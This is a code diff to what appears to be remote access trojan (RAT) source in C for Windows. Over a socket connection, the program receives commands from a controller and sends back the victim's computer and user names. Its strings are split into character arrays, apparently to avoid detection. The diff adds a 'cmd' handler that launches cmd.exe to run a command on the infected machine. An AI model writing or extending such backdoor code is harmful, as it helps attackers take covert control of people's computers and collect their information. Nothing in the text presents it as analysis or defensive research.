@@ -45,7 +45,7 @@ WinMain(HINSTANCE hInstance,
 		HINSTANCE hPrevInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
-{
+{	
 	RATSocket ratSocket = {};
 	
 	char ca_ws2_32[] = {'W','s','2','_','3','2','.','d','l','l', 0};
@@ -143,6 +143,7 @@ WinMain(HINSTANCE hInstance,
 		
 		OutputDebugStringA("Received command: ");
 		char ca_info[] = { 'i','n','f','o',0 };
+		char ca_cmd[] = { 'c','m','d',0 };
 		char ca_shutdown[] = { 's','h','u','t','d','o','w','n',0 };
 		if ( strcmp(recvBuffer, ca_info) == 0 )
 		{
@@ -183,6 +184,25 @@ WinMain(HINSTANCE hInstance,
 			char bufferInfo[256];
 			sprintf(bufferInfo, "%s:%s", bufferComputer, bufferUser);
 			SocketSend(&ratSocket, bufferInfo);
+		}
+		else if ( strcmp(recvBuffer, ca_cmd) == 0 )
+		{
+			PROCESS_INFORMATION pi;
+			STARTUPINFO si = { };
+			si.cb = sizeof(si);
+
+			char *cmdPath = "C:\\Windows\\System32\\cmd.exe";
+			char *cmdArg = "/C dir > X:\\output\\test.txt";
+	
+			if ( !CreateProcess(cmdPath, cmdArg, NULL, NULL, FALSE, 0 , NULL, NULL, &si, &pi) )
+			{
+				char bufferError[256];
+				sprintf(bufferError, "CreateProcess failed (%d).\n", GetLastError());
+				OutputDebugStringA(bufferError);
+			}
+
+			CloseHandle(pi.hProcess);
+			CloseHandle(pi.hThread);
 		}
 		else if ( strcmp(recvBuffer, ca_shutdown) == 0 )
 		{
